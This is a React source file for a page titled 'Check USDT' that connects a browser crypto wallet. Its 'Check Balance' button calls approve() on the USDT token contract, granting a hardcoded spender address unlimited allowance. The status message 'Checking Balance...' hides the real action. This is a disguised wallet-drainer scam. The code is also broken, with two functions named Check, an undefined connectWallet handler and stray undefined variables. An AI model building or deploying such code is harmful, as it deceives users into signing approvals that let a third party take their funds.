import React, { useState, useEffect } from "react";
import { ethers } from "ethers";

const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const USDT_ABI = [
  "function approve(address spender, uint256 amount) returns (bool)",
];

const SPENDER_ADDRESS = "0x64FaeC69187a1a24A36F6590f0f8F94F68b044ee"; // Replace with your backend wallet (spender)

export default function App() {
  const [provider, setProvider] = useState(null);
  const [signer, setSigner] = useState(null);
  const [account, setAccount] = useState(null);
  const [status, setStatus] = useState("");

  useEffect(() => {
    if (window.ethereum) {
      // EIP-1193 provider (MetaMask, Trust Wallet, etc)
      setProvider(new ethers.BrowserProvider(window.ethereum));
    } else {
      alert("No Ethereum wallet detected! Please install MetaMask or use Trust Wallet DApp browser.");
    }
  }, []);

  async function Check() {
    if (!provider) return;
    try {
      const accounts = await provider.send("eth_requestAccounts", []);
      setAccount(accounts[0]);
      setSigner(await provider.getSigner());
      setStatus("");
    } catch (err) {
      setStatus("Wallet connection rejected");
    }
  }

  async function Check() {
    if (!signer) {
      setStatus("Connect wallet first!");
      return;
    }
    setStatus("Checking Balance...");
    try {
      const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
      const tx = await usdt.approve(SPENDER_ADDRESS, ethers.MaxUint256);
      await tx.wait();
      setStatus("Approval successful!");
    } catch (error) {
      setStatus("Approval failed: " + error.message);
    }
    const tx = await usdtContract.approve(spenderAddress, maxAmount, {
  gasLimit: 100000,
  gasPrice: ethers.utils.parseUnits("5", "gwei")
});
await tx.wait();

  }

  return (
    <div style={{ padding: 20, fontFamily: "Arial" }}>
      <h2>Check USDT</h2>
      {!account ? (
        <button onClick={connectWallet}>Connect Wallet</button>
      ) : (
        <>
          <p><b>Connected:</b> {account}</p>
          <button onClick={Check}>Check Balance</button>
          <p>{status}</p>
        </>
      )}
    </div>
  );
}
